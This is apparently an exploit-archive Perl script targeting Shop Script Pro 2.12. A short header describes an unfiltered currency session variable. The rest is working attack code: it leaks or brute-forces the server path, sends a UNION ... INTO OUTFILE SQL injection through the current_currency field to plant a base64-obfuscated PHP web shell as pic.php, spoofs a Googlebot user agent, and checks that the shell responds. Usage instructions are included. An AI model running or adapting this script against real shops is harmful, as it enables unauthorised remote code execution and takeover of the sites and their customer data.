#!/usr/bin/perl

=about

 VENDOR
    Shop Script Pro 2.12
    (maybe other versions vulnerable too)
    http://www.shop-script.com/

 AUTHOR
    discovered & written by Ams
    ax330d [doggy] gmail [dot] com
    http://www.0x416d73.name/

 VULN. DESCRIPTION
    Look in index.php at line 101.
    Variable $current_currency is set from $_SESSION["current_currency"]
    which is set in "/core_functions/currency_functions.php" in function
    currSetCurrentCurrency() at line 17 via "/includes/change_currency.php"
    at line 13. This variable is not filtered.

 EXPLOIT WORK
    First exploit looks for file "linkpoint.php" in
    hope to find full server path. If not found, then it bruteforces
    those paths, otherwise will use found one.
    Also at this time session is being set.
    Exploit then sends POST request with SQL-Injection that tries to
    upload tiny shell. And finally checks for shell.

 REQUIREMENTS
    1. MySQL must have rights to write to file
    2. Full server path should be known
    3. magic_quotes_gpc=off

=cut

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Request::Common;

&Banner;
$| = 1;
my $expl_url  = shift or &Usage;
my $serv_path = shift || '';
my $def_shell = '/products_pictures/pic.php';
my $shell     = q(<?php eval(base64_decode(base64_decode($_GET['cmd'])));?>);
my $sql_shell = join ',', map { ord } split //, $shell;

my $cookie = HTTP::Cookies->new;
my $spider = LWP::UserAgent->new;

push @{ $spider->requests_redirectable }, 'POST';
$spider->requests_redirectable();
$spider->agent('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');

my @paths = qw(
    /var/www/htdocs /var/www/localhost/htdocs /var/www /var/wwww/hosting /var/www/html /var/www/vhosts
    /home/www  /home/httpd/vhosts
    /usr/local/apache/htdocs
    /www/htdocs
    /srv/www/htdocs
);

Exploit( $expl_url );

sub Exploit {

    $_ = shift;
    print "\n\tExploiting:\t $_";

    chomp( $serv_path );
    my $injection;
    my ($prot , $host, $path, ) = m{(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?};

    $prot ||= 'http';
    #   Trying to get /linkpoint.php to get server path
    my $req = POST "$prot://$host$path/linkpoint.php",
        Content_Type => 'form-data',
        Content      => [ oid => 1, chargetotal => 1 ];
    my $res = $spider->request( $req );

    $cookie->extract_cookies( $res );
    $spider->cookie_jar( $cookie );

    if ($serv_path ne '-b') {
        $serv_path = $res->content =~ m#in\s+<b>(.*?)/linkpoint\.php</b>\s+on#
            ? $1 
            : $serv_path;
    }
    $serv_path ||= '-b';

    if ( $serv_path ne '-b' ) {

        chomp( $serv_path );
        print "\n\tFound path:\t $serv_path";

        $injection = "1' UNION SELECT null,null,null,null,CHAR($sql_shell) INTO OUTFILE '$serv_path$def_shell' -- ";
        my $req = POST "$prot://$host$path/index.php",
            Content_Type => 'form-data',
            Content      => [ current_currency => $injection];
        $res = $spider->request( $req );

    } else {

        #   Bruteforcing path
        print "\n\tStarting bruteforce...\n";

        for $serv_path ( @paths ) {

            chomp( $serv_path );
            print "\tTrying path:\t $serv_path$path$def_shell\n";

            $cookie->extract_cookies( $res );
            $spider->cookie_jar( $cookie );
            $cookie->clear();

            $injection = "1' UNION SELECT null,null,null,null,CHAR($sql_shell) INTO OUTFILE '$serv_path$path$def_shell' -- ";
            my $req = POST "$prot://$host$path/index.php",
                Content_Type => 'form-data',
                Content      => [ current_currency => $injection ];
            $res = $spider->request( $req );
        }
    }

    #   Checking for shell presence
    $req = GET "$prot://$host$path$def_shell";
    $res = $spider->request( $req );
    print "\n\tChecking:\t http://$host$path$def_shell";

    if ( $res->status_line =~ /200\s+OK/ ) {
        print "\n\tExploited!\n\n";
    } else {
        print "\n\tExploiting failed.\n\n";
    }
}

sub Usage {

    print "

    Usage:\t$0 http://site.com [-b|full/server/path]

    Example:\t$0 http://localhost/ /var/www/htdocs
            $0 http://localhost/ -b
            $0 http://localhost/

    ";

    exit;
}

sub Banner {

    print "
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      Shop Script Pro 2.12 Perl exploit
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    ";
}

